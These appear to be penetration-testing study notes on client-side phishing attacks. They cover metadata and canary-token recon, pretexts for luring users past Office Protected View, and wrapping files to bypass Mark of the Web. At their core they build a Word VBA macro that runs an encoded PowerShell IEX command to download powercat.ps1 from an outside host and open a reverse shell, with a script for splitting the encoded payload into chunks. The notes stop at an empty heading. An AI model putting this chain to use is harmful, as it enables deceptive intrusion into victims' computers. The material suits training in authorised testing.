### Client-side Attacks

Phishing often takes advantage of client side attacks.  Client-side attacks are often delivered via a phishing email or some other means (USB dropping, watering hole attacks, etc).  They work by delivering malicious files directly to users.

#### Target Recon

Gathering information on a system that we do not have access to can be a challenge but it's not impossible.  It also leaves no traces of our actions on the target's systems.

We can gather documents created by the target and check metadata tags.  This often includes a variety of info including author, creation date, name and version of software used to create it, OS of the client, and potentially more!

We can search for different documents using Google Dorks and then use different tools to extract that documents metadata.

`exiftool <document>` will spit out that documents metadata.

![pic4](Images/pic4.png)  

Including, again, the creation date and program used.

![pic5](Images/pic5.png)  

You can also do something called `Device Fingerprinting` by using the following website to create a canary token, `https://canarytokens.org/nest/generate`.  We then would create a pretext for sending someone a link, i.e. a document that needs a portion clarified and a link to that section.  We then hide the canary token in a link and hope the user clicks on it.  This will return information on the system based on the canary token that was sent.

With some of the info we get back, we can get some 'cleaner' information regarding the user agent with `https://explore.whatismybrowser.com/useragents/parse/`.

#### Getting around Protected View

Instead of emailing the document directly, as it would likely be blocked or ignored, we should use alternative methods like getting someone to download it from a sharing site.

Office will also "lock" a document with the "Protected View" tab if the system knows it's been downloaded (a special tag on the document, Mark of the Web or MOTW, makes this possible).  One way around this is to blur a portion of the document and instruct the user to click Enable in order to unblur and see the rest of the document.

In later versions of office, it's no longer as easy as clicking a single button to unblock the content.  Even so, create pretext for that user to go through the steps, albeit more, to get the information they think is on the document.

You can also try to wrap the document in a file format such as zip, 7zip, iso, or img to try and bypass the MOTW tag.

#### Creating our Macro

Do not use .docx as it can not store a macro.  .doc and .docm are acceptable file extensions.

We'll find the Macro section in a new word document under the View tab.  In the new window, we'll name our macro, set the `Macros in:` field to our document so they get saved to the document, and click create.

That opens up the VBA editing section where we can launch powershell and do other things.

Here, we're going to create a macro that opens powershell and then downloads and runs powercat.ps1 to create a reverse shell.

`IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.197/powercat.ps1');powercat -c 192.168.45.197 -p 443 -e powershell`

This command should do just that.  First it downloads powercat.ps1 and then uses that to run a reverse shell to the IP listed on port 443.  When using powershell, it's very important to encode this into UTF16-LE and then Base64.

This can be done with cyberchef.io.  Use the `encode text` function.  Select the `UTF16-LE` and then the `Base64`.

Then run it through a python script to split that up into chunks and have powershell append it from the document.

```
str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdw.......AIABwAG8AdwBlAHIAcwBoAGUAbABsAA=="

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

This script should spit it out into chunks that powershell can handle.

![pic6](Images/pic6.png)  

Then, drop that into the macro.  Make sure to clean the code up.  Some versions may error out if it's not.

![pic7](Images/pic7.png)  

Start up your http server to host `powercat.ps1` and start your listener to the correct port and send the file.  If a user clicks on it and enables macros, you're in.

#### Abusing Windows Library Files

